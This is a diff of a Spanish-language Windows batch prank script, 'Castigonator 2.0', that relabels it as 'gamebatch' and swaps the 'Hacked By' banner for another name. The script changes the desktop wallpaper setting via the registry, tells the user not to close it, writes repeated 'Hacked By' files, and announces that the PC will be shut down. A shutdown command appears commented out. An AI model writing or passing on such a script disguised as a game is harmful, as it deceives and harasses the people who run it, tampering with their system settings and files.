@@ -7,7 +7,7 @@ REG ADD "HKCU\Control Panel\Desktop" /V WallpaperStyle /T REG_SZ /F /D 2
 ::shutdown.exe -s -t 00
 
 @echo off
-title Castigonator v. 2.0
+title gamebatch
 color 1f
 echo.
 msg * Una ves abierto esto no lo debes de cerrar...
@@ -88,24 +88,24 @@ echo Ahora se un buen chico ;)...
 pause
 cls
 title Warning!!
-echo off>>Hacked By CASTIGONATOR 2.0
+echo off>>Hacked By ORLAYNETA
 ------------------------------------------
 echo.
-echo off>>Hacked By CASTIGONATOR 2.0
+echo off>>Hacked By  ORLAYNETA
 echo.
-echo off>>Hacked By CASTIGONATOR 2.0
+echo off>>Hacked By ORLAYNETA
 echo.
-echo off>>Hacked By CASTIGONATOR 2.0
+echo off>>Hacked By  ORLAYNETA
 echo.
-echo off>>Hacked By CASTIGONATOR 2.0
+echo off>>Hacked By ORLAYNETA
 echo.
-echo off>>Hacked By CASTIGONATOR 2.0
+echo off>>Hacked By  ORLAYNETA
 echo.
-echo off>>Hacked By CASTIGONATOR 2.0
+echo off>>Hacked By ORLAYNETA
 echo.
-echo off>>Hacked By CASTIGONATOR 2.0
+echo off>>Hacked By  ORLAYNETA
 echo.
-echo off>>Hacked By CASTIGONATOR 2.0
+echo off>>Hacked By ORLAYNETA
 -------------------------------------------
 msg * Fue un placer jugar contigo.
 msg * Ahora se apagara el PC y todo estara arreglado.
